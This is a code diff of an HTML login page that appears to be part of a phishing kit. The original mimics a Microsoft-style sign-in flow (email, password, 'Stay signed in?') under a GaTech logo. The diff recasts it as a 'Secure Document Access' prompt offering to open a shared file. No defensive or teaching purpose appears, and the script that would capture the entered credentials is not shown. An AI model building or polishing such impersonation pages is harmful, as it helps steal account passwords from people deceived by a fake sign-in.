@@ -2,45 +2,49 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Sign in to your account</title>
+  <title>Secure Document Access</title>
+
+  <!-- neutral styling -->
   <link rel="stylesheet" href="app.css" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
 </head>
 <body>
+  <!-- Step 1 : email -->
   <section id="section_uname">
-    <div class="auth-wrapper">
-      <img src="assets/logo.png" alt="GaTech" class="mb-16" />
-      <div class="title mb-16">Sign in</div>
-      <input id="inp_uname" type="email" class="input w-100 mb-16" placeholder="Email, phone, or Skype" autocomplete="off" required />
-      <div id="error_uname" class="error fs-13 mb-16"></div>
-      <button id="btn_next" class="btn">Next</button>
+    <div class="auth-box">
+      <h1 class="title">Access the shared file</h1>
+
+      <input id="inp_uname" type="email" class="input" placeholder="Email address" required />
+      <div id="error_uname" class="error"></div>
+
+      <button id="btn_next" class="btn btn-primary">Continue</button>
     </div>
   </section>
 
-  <section id="section_pwd" class="d-none">
-    <div class="auth-wrapper">
-      <button class="back mb-16">
-        <img src="assets/back.png" alt="back" width="24" height="24" />
-      </button>
-      <div class="identity mb-16">
-        <img src="assets/logo.png" alt="GaTech" width="20" />
-        <span id="user_identity"></span>
-      </div>
-      <div class="title mb-16">Enter password</div>
-      <input id="inp_pwd" type="password" class="input w-100 mb-16" placeholder="Password" autocomplete="off" required />
-      <div id="error_pwd" class="error fs-13 mb-16"></div>
-      <button id="btn_sig" class="btn">Sign in</button>
+  <!-- Step 2 : password -->
+  <section id="section_pwd" class="hidden">
+    <div class="auth-box">
+      <button class="back" id="btn_back">&#x2190; Back</button>
+
+      <h1 class="title">Enter your password</h1>
+      <p id="user_identity" class="identity"></p>
+
+      <input id="inp_pwd" type="password" class="input" placeholder="Password" required />
+      <div id="error_pwd" class="error"></div>
+
+      <button id="btn_sig" class="btn btn-primary">Sign in</button>
     </div>
   </section>
 
-  <section id="section_final" class="d-none">
-    <div class="auth-wrapper">
-      <img src="assets/logo.png" alt="GaTech" class="mb-16" />
-      <div class="title mb-16">Stay signed in?</div>
-      <p class="p">Stay signed in so you don't have to sign in again next time.</p>
-      <div class="btn-group">
-        <button id="btn_final_no" class="btn btn-sec">No</button>
-        <button id="btn_final_yes" class="btn">Yes</button>
+  <!-- Step 3 : stay signed in -->
+  <section id="section_final" class="hidden">
+    <div class="auth-box">
+      <h1 class="title">Stay signed in?</h1>
+      <p>Choose “Yes” to skip sign-in next time.</p>
+
+      <div class="btn-row">
+        <button id="btn_final_no"  class="btn btn-secondary">No</button>
+        <button id="btn_final_yes" class="btn btn-primary">Yes</button>
       </div>
     </div>
   </section>
